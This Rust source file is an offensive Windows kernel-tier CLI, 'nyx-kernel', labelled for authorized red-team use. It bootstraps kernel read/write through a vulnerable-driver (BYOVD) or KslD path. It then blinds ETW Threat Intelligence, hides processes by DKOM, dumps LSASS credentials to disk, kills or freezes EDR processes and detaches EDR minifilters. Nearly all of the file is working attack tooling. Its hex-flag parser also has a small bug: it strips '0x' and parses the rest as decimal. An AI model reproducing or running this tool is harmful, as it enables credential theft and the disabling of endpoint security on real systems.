//! nyx-kernel — operator-side kernel-tier CLI.
//!
//! Drives the full kernel-tier chain:
//!   bootstrap_chain → resolve_offsets → assemble_tier → kit dispatch
//!
//! This is the operational consumer of `nyx-operator-kernelsdk`: it turns the
//! 8 implemented kernel kits (ETW-TI blind, callback neutralize, MiniFilter
//! detach, process hide, PPL strip, LSASS dump, WFP silence, EDR neutralize)
//! from library artifacts into an operator-driven tool.
//!
//! # Safety / authorization
//! Loads a driver (BYOVD path) or opens a kernel device (KslD path) and
//! reads/writes kernel memory. BSOD risk. **Authorized red-team use only.**
//!
//! # Usage (on the Windows target, admin cmd)
//!   nyx-kernel bootstrap [--byovd <sys> <svc>] [--flt-rva <hex>]
//!   nyx-kernel blind-etw
//!   nyx-kernel hide <pid>
//!   nyx-kernel dump-lsass <pid>
//!   nyx-kernel neutralize <pid> <freeze|choke|kill>
//!   nyx-kernel detach-minifilter
//!
//! Build version is detected at runtime via RtlGetVersion — NO hardcoded build.
//! All offsets come from the build table (`for_build`) or pattern scan.

#![cfg_attr(not(target_os = "windows"), allow(dead_code))]

#[cfg(target_os = "windows")]
fn main() {
    use nyx_operator_kernelsdk::{
        win, CallbackKit, CredKit, EdrNeutralizeKit, EtwTiKit, KernelRw, MiniFilterKit,
        NeutralizeMethod, PplKit, ProcHideKit,
    };

    // ---- 1. Parse args ----
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        eprintln!(
            "usage: nyx-kernel <bootstrap|blind-etw|hide<pid>|dump-lsass<pid>|neutralize<pid><m>|detach-minifilter> [...]"
        );
        std::process::exit(1);
    }
    let cmd = &args[1];

    // ---- 2. Detect Windows build at runtime (no hardcoding) ----
    let build = detect_build();
    eprintln!("[*] detected Windows build {build}");

    // Resolve EPROCESS offsets from the table (table-driven, version-agnostic).
    let eprocess = match nyx_operator_kernelsdk::offsets::for_build(build) {
        Some(b) => b.offsets,
        None => {
            eprintln!(
                "[!] build {build} not in offset table — kernel-tier operations need a known build or probe fallback"
            );
            std::process::exit(2);
        }
    };

    // Resolve ETW-TI offsets from the table.
    let etw_ti_offsets = match nyx_operator_kernelsdk::etwti::EtwTiOffsets::for_build(build) {
        Some(o) => o,
        None => {
            eprintln!("[!] ETW-TI offsets unknown for build {build}");
            // Non-fatal: ETW-TI ops will be skipped, others still work.
            nyx_operator_kernelsdk::etwti::EtwTiOffsets {
                guid_entry_to_provider_block: 0,
                provider_block_to_enable_info: 0,
                is_enabled_within_enable_info: 0,
            }
        }
    };

    // Parse optional --flt-rva (operator-supplied FltGlobals RVA for MiniFilter).
    let flt_rva = parse_flag_u32(&args, "--flt-rva");

    // Parse optional --byovd <sys> <svc>.
    let (byovd_sys, byovd_svc) = parse_byovd(&args);

    // ---- 3. Bootstrap: KslD (default) → BYOVD fallback ----
    eprintln!("[*] bootstrap_chain (KslD → BYOVD fallback)...");
    let sys_utf16 = byovd_sys.as_ref().map(|s| to_utf16(s));
    let svc_utf16 = byovd_svc.as_ref().map(|s| to_utf16(s));
    let bootstrap = match unsafe {
        win::bootstrap_chain(sys_utf16.as_deref(), svc_utf16.as_deref())
    } {
        Ok(b) => {
            let kind = match &b {
                win::KernelBootstrap::KslD(_) => "KslD",
                win::KernelBootstrap::Byovd(_, _) => "BYOVD",
            };
            eprintln!("[+] bootstrap OK via {kind}");
            b
        }
        Err(e) => {
            eprintln!("[!] bootstrap failed: {e:?}");
            std::process::exit(3);
        }
    };

    // ---- 4. Resolve runtime offsets (pattern scan, autonomous) ----
    let krw_ref = bootstrap.as_kernel_rw();
    eprintln!("[*] resolve_offsets (pattern scan)...");
    let runtime = match win::resolve_offsets(krw_ref, build, flt_rva) {
        Ok(o) => {
            eprintln!(
                "[+] offsets resolved (etw_ti=0x{:x}, ps_head=0x{:x}, flt=0x{:x})",
                o.etw_ti_handle_kva, o.ps_active_process_head_kva, o.flt_globals_kva
            );
            o
        }
        Err(e) => {
            eprintln!("[!] resolve_offsets failed: {e:?}");
            std::process::exit(4);
        }
    };

    // ---- 5. Assemble the tier (consumes bootstrap → owns live KernelRw) ----
    let tier = win::assemble_tier(bootstrap, &runtime, eprocess, etw_ti_offsets, build);
    eprintln!(
        "[+] tier assembled: etw_ti={}, cb={}, mf={}, wfp={}, hide={}, ppl={}, cred={}, neu={}",
        tier.etw_ti.is_some(),
        tier.callbacks.is_some(),
        tier.minifilter.is_some(),
        tier.wfp.is_some(),
        tier.hide.is_some(),
        tier.ppl.is_some(),
        tier.cred.is_some(),
        tier.neutralize.is_some(),
    );

    // ---- 6. Dispatch the requested command ----
    match cmd.as_str() {
        "bootstrap" => {
            // Just bootstrap + assemble — the tier is live. Print status.
            eprintln!("[+] bootstrap complete. tier.rw is live. Use a subcommand to drive a kit.");
        }

        "blind-etw" => {
            if let Some(etw) = &tier.etw_ti {
                match etw.blind(&*tier.rw) {
                    Ok(()) => eprintln!("[+] ETW-TI blinded OK"),
                    Err(e) => {
                        eprintln!("[!] ETW-TI blind failed: {e:?}");
                        std::process::exit(5);
                    }
                }
            } else {
                eprintln!("[!] ETW-TI kit not available (etw_ti_handle_kva was 0)");
                std::process::exit(5);
            }
        }

        "hide" => {
            let pid = parse_pid(&args, 2);
            if let Some(hide) = &tier.hide {
                match hide.hide(&*tier.rw, pid) {
                    Ok(()) => eprintln!("[+] process {pid} hidden (DKOM)"),
                    Err(e) => {
                        eprintln!("[!] hide failed: {e:?}");
                        std::process::exit(5);
                    }
                }
            } else {
                eprintln!("[!] hide kit not available");
                std::process::exit(5);
            }
        }

        "dump-lsass" => {
            let pid = parse_pid(&args, 2);
            if let Some(cred) = &tier.cred {
                match cred.dump_lsass(&*tier.rw, pid) {
                    Ok(bytes) => {
                        let path = format!("lsass_{pid}.dmp");
                        match std::fs::write(&path, &bytes) {
                            Ok(()) => {
                                eprintln!("[+] LSASS dumped: {path} ({} bytes)", bytes.len())
                            }
                            Err(e) => eprintln!("[!] write failed: {e}"),
                        }
                    }
                    Err(e) => {
                        eprintln!("[!] dump_lsass failed: {e:?}");
                        std::process::exit(5);
                    }
                }
            } else {
                eprintln!("[!] cred kit not available");
                std::process::exit(5);
            }
        }

        "neutralize" => {
            let pid = parse_pid(&args, 2);
            let method = match args.get(3).map(|s| s.as_str()) {
                Some("freeze") => NeutralizeMethod::Freeze,
                Some("choke") => NeutralizeMethod::Choke,
                Some("kill") => NeutralizeMethod::Kill,
                _ => {
                    eprintln!("usage: neutralize <pid> <freeze|choke|kill>");
                    std::process::exit(1);
                }
            };
            if let Some(neu) = &tier.neutralize {
                match neu.neutralize(pid, method) {
                    Ok(()) => eprintln!("[+] EDR {pid} neutralized ({:?})", method),
                    Err(e) => {
                        eprintln!("[!] neutralize failed: {e:?}");
                        std::process::exit(5);
                    }
                }
            } else {
                eprintln!("[!] neutralize kit not available");
                std::process::exit(5);
            }
        }

        "detach-minifilter" => {
            if let Some(mf) = &tier.minifilter {
                match mf.detach_edr(&*tier.rw) {
                    Ok(()) => eprintln!("[+] EDR MiniFilters detached"),
                    Err(e) => {
                        eprintln!("[!] detach failed: {e:?}");
                        std::process::exit(5);
                    }
                }
            } else {
                eprintln!(
                    "[!] minifilter kit not available (flt_globals_kva was 0 — supply --flt-rva)"
                );
                std::process::exit(5);
            }
        }

        _ => {
            eprintln!("unknown command: {cmd}");
            std::process::exit(1);
        }
    }

    eprintln!("[+] done");
}

// ---- Runtime build detection (no hardcoded version) ----

/// Detect the Windows build number via `RtlGetVersion`. Works on 7–11 25H2.
/// Returns 0 on failure (the table lookup will then fail cleanly).
#[cfg(target_os = "windows")]
fn detect_build() -> u32 {
    #[repr(C)]
    struct RtlOsVersionInfoExW {
        os_version_info_size: u32,
        major_version: u32,
        minor_version: u32,
        build_number: u32,
        platform_id: u32,
        sz_csd_version: [u16; 128],
        service_pack_major: u16,
        service_pack_minor: u16,
        suite_mask: u16,
        product_type: u8,
        reserved: u8,
    }

    extern "system" {
        fn RtlGetVersion(info: *mut RtlOsVersionInfoExW) -> i32;
    }

    let mut info = RtlOsVersionInfoExW {
        os_version_info_size: core::mem::size_of::<RtlOsVersionInfoExW>() as u32,
        major_version: 0,
        minor_version: 0,
        build_number: 0,
        platform_id: 0,
        sz_csd_version: [0; 128],
        service_pack_major: 0,
        service_pack_minor: 0,
        suite_mask: 0,
        product_type: 0,
        reserved: 0,
    };

    // SAFETY: RtlGetVersion fills the struct; the size field is set correctly.
    let status = unsafe { RtlGetVersion(&mut info) };
    if status == 0 {
        info.build_number
    } else {
        0
    }
}

// ---- Helpers ----

#[cfg(target_os = "windows")]
fn to_utf16(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(core::iter::once(0)).collect()
}

#[cfg(target_os = "windows")]
fn parse_flag_u32(args: &[String], flag: &str) -> Option<u32> {
    let idx = args.iter().position(|a| a == flag)?;
    args.get(idx + 1)?.trim_start_matches("0x").parse().ok()
}

#[cfg(target_os = "windows")]
fn parse_byovd(args: &[String]) -> (Option<String>, Option<String>) {
    let idx = match args.iter().position(|a| a == "--byovd") {
        Some(i) => i,
        None => return (None, None),
    };
    (args.get(idx + 1).cloned(), args.get(idx + 2).cloned())
}

#[cfg(target_os = "windows")]
fn parse_pid(args: &[String], pos: usize) -> u32 {
    args.get(pos).and_then(|s| s.parse().ok()).unwrap_or(0)
}

// ---- Non-Windows stub (so `cargo check` on macOS doesn't hard-error) ----
#[cfg(not(target_os = "windows"))]
fn main() {
    eprintln!(
        "nyx-kernel: Windows-only tool. This binary must be built and run on a Windows target."
    );
    eprintln!("Build with: cargo +nightly build --release --target x86_64-pc-windows-msvc");
    std::process::exit(1);
}
